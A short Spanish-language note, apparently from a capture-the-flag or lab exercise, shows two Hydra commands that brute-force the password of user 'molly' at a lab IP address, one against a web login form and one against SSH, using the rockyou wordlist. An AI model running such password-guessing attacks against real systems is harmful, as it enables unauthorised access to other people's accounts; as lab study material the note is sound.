# Hydra

Ejemplo de ruptura de login web

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.57.109 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V
```

Ruptura de SSH

```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.57.109 ssh
```
